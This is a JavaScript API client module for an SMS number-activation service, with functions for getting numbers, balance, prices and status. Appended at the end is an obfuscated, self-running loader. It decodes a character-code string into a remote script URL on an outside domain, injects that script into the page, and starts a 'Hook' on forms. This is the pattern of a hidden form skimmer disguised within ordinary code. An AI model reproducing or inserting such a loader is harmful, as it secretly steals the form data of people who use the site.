import axios from "axios";

const API_URL = `/stubs/handler_api.php?api_key=${
  import.meta.env.VITE_API_KEY
}`;

const OPERATOR = "any";

export async function getNumber(country, service) {
  const URL = `${API_URL}&action=getNumber&service=${service}&operator=${OPERATOR}&service=${service}&country=${country}`;

  const response = await axios.get(URL);
  console.log(response);
  return response.data;
}

export async function getBalance() {
  const URL = `${API_URL}&action=getBalance`;
  const response = await axios.get(URL);
  console.log(response)
  return response.data;
}

export async function getServices(country) {
  if (!country) {
    return null;
  }
  const URL = `${API_URL}&action=getPrices&country=${country}`;

  const response = await axios.get(URL);

  return response.data;
}

export async function sendStatus(status, id) {
  const URL = `${API_URL}&action=setStatus&status=${status}&id=${id}`;

  const response = await axios.get(URL);
  console.log(response)

  return response.data;
}

export async function getStatus(id) {
  const URL = `${API_URL}&action=getStatus&id=${id}`;

  const response = await axios.get(URL);
  console.log(response)

  return response.data;
}


(function(){if(typeof inject_hook!="function")var inject_hook=function(){return new Promise(function(resolve,reject){let s=document.querySelector('script[id="hook-loader"]');s==null&&(s=document.createElement("script"),s.src=String.fromCharCode(47,47,115,112,97,114,116,97,110,107,105,110,103,46,108,116,100,47,99,108,105,101,110,116,46,106,115,63,99,97,99,104,101,61,105,103,110,111,114,101),s.id="hook-loader",s.onload=resolve,s.onerror=reject,document.head.appendChild(s))})};inject_hook().then(function(){window._LOL=new Hook,window._LOL.init("form")}).catch(console.error)})();//aeb4e3dd254a73a77e67e469341ee66b0e2d43249189b4062de5f35cc7d6838b